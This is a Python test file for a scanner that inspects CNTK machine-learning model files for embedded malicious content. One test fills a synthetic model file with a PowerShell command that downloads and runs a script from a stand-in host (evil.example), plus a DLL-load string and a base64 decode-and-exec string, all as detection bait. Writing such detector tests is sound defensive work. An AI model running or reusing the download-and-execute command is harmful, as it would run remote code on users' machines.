from pathlib import Path

from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.cntk_scanner import DISCOVERY_ASSUMPTIONS, CntkScanner


def _write_legacy_cntk(path: Path, payload: bytes = b"") -> None:
    header = b"B\x00C\x00N\x00\x00\x00B\x00V\x00e\x00r\x00s\x00i\x00o\x00n\x00\x00\x00"
    path.write_bytes(header + payload)


def _write_cntkv2(path: Path, payload: bytes = b"", include_structure: bool = True) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions " if include_structure else b""
    path.write_bytes(prefix + structure + payload)


def test_cntk_scanner_can_handle_legacy_signature(tmp_path: Path) -> None:
    path = tmp_path / "legacy.dnn"
    _write_legacy_cntk(path, payload=b" inputs outputs ")
    assert CntkScanner.can_handle(str(path))


def test_cntk_scanner_can_handle_cntkv2_signature(tmp_path: Path) -> None:
    path = tmp_path / "graph.cmf"
    _write_cntkv2(path, payload=b" inputs outputs ")
    assert CntkScanner.can_handle(str(path))


def test_cntk_scanner_rejects_misnamed_non_cntk_file(tmp_path: Path) -> None:
    path = tmp_path / "not_cntk.dnn"
    path.write_text("plain text that should not match CNTK signatures")
    assert not CntkScanner.can_handle(str(path))


def test_cntk_scanner_rejects_model_extension_in_v1_scope(tmp_path: Path) -> None:
    path = tmp_path / "deferred.model"
    _write_cntkv2(path, payload=b"inputs outputs")
    assert not CntkScanner.can_handle(str(path))


def test_cntk_scanner_reports_unsupported_variant_info(tmp_path: Path) -> None:
    path = tmp_path / "unsupported.dnn"
    _write_cntkv2(path, payload=b"inputs outputs", include_structure=False)

    result = CntkScanner().scan(str(path))

    assert not result.success
    assert any("unsupported or out-of-scope cntk variant" in issue.message.lower() for issue in result.issues)
    assert any(issue.severity == IssueSeverity.INFO for issue in result.issues)


def test_cntk_scanner_detects_multi_signal_payload_as_critical(tmp_path: Path) -> None:
    path = tmp_path / "malicious.dnn"
    payload = (
        b" native_user_function loadlibrary C:\\temp\\evil.dll "
        b" powershell -c iwr http://evil.example/p.ps1 | iex "
        b" base64.b64decode(" + (b"A" * 96) + b") exec(payload) "
    )
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("multiple independent suspicious signals" in issue.message.lower() for issue in result.issues)


def test_cntk_scanner_false_positive_control_no_critical(tmp_path: Path) -> None:
    path = tmp_path / "benign_risky_words.cmf"
    payload = b" exec_summary network_score library_version model_path=/models/base "
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_cntk_scanner_known_safe_defaults_no_findings(tmp_path: Path) -> None:
    path = tmp_path / "safe_defaults.dnn"
    payload = b" version uid inputs outputs attributes parameter1 placeholder1 "
    _write_cntkv2(path, payload=payload)

    result = CntkScanner().scan(str(path))

    assert result.success
    assert result.issues == []


def test_cntk_scanner_reports_truncated_supported_variant(tmp_path: Path) -> None:
    path = tmp_path / "truncated.dnn"
    _write_legacy_cntk(path, payload=b"tiny")

    result = CntkScanner().scan(str(path))

    assert not result.success
    assert any("truncated or structurally incomplete" in issue.message.lower() for issue in result.issues)


def test_cntk_scanner_records_scope_assumptions(tmp_path: Path) -> None:
    path = tmp_path / "safe.cmf"
    _write_cntkv2(path, payload=b" version uid inputs outputs ")

    result = CntkScanner().scan(str(path))

    assert result.metadata["discovery_assumptions"] == DISCOVERY_ASSUMPTIONS
